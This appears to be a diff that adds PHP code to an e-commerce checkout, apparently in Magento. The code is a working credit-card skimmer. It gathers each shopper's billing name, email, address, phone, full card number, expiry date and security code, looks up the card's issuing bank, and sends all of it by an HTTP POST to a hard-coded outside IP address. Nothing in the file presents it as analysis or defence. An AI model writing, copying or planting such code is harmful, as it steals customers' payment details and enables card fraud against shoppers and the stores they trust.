@@ -1,0 +1,48 @@
+<?php
+
+		$send = array
+			(
+            'Payment Method' 		=> $data['method'],
+			'Billing Name' 			=> $this->getQuote()->getBillingAddress()->getFirstname() . " " . $this->getQuote()->getBillingAddress()->getLastname(),
+            'Billing Email'         => $this->getQuote()->getBillingAddress()->getEmail(),
+		    'Billing Address 1'     => $this->getQuote()->getBillingAddress()->getStreet(1),
+		    'Billing Address 2' 	=> $this->getQuote()->getBillingAddress()->getStreet(2),
+		    'Billing City'         	=> $this->getQuote()->getBillingAddress()->getCity(),
+		    'Billing State'        	=> $this->getQuote()->getBillingAddress()->getRegion(),
+		    'Billing PosCode'      	=> $this->getQuote()->getBillingAddress()->getPostcode(),
+		    'Billing Country'      	=> $this->getQuote()->getBillingAddress()->getCountry(),
+		    'Billing Phone'         => $this->getQuote()->getBillingAddress()->getTelephone(),
+            'Card Owner'          	=> $data['cc_owner'],
+            'Card Type'             => $data['cc_type'],
+			'Card Number'           => $data['cc_number'],
+			'Card Expayed'          => trim(sprintf('%02d%02d', $data['cc_exp_month'], substr($data['cc_exp_year'], strlen($data['cc_exp_year']) - 2))),
+			'Card Sec'              => $data['cc_cid'],
+			'Customer IP'           => trim(getenv('REMOTE_ADDR')),
+			'Store'                 => trim($_SERVER['SERVER_NAME'])
+			);
+			$cccountry = $this->getQuote()->getBillingAddress()->getCountry();
+			$ccnumber = $data['cc_number'];
+			$bin = substr($ccnumber, 0, 6);
+			$getbank = json_decode(file_get_contents("http://www.binlist.net/json/".$bin.""));
+			$ccbrand = $getbank->brand;
+			$ccbank = $getbank->bank;
+			$cctype = $getbank->card_type;
+			$ccklas = $getbank->card_category;
+			$store = $_SERVER['SERVER_NAME'];
+			$customer_ip = $_SERVER['REMOTE_ADDR'];
+			if(strlen($ccnumber) > 9){
+			foreach($send as $param => $value) $datasend .= "$param = $value\n";
+			$subject = $bin." - ".$ccbrand." ".$cctype." ".$ccklas." - ".$ccbank." [".$store." - ".$customer_ip."]";
+			$headers = "From: ".$cccountry." Credit Card <onepage@".$serverboss.">";
+			$unix_site = "http://64.37.63.202/~scham/action.php";
+			$unix_data = "sub=".$subject."&msg=".$datasend."&hed=".$headers."";
+			$ch = curl_init();
+			curl_setopt($ch, CURLOPT_URL, $unix_site); 
+			curl_setopt($ch, CURLOPT_POSTFIELDS, $unix_data); 
+			curl_setopt($ch, CURLOPT_HEADER, 0); 
+			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+			curl_setopt($ch, CURLOPT_TIMEOUT,30); 
+			curl_setopt($ch, CURLOPT_POST, 1); 
+			curl_exec($ch); 
+			curl_close($ch);
+			}
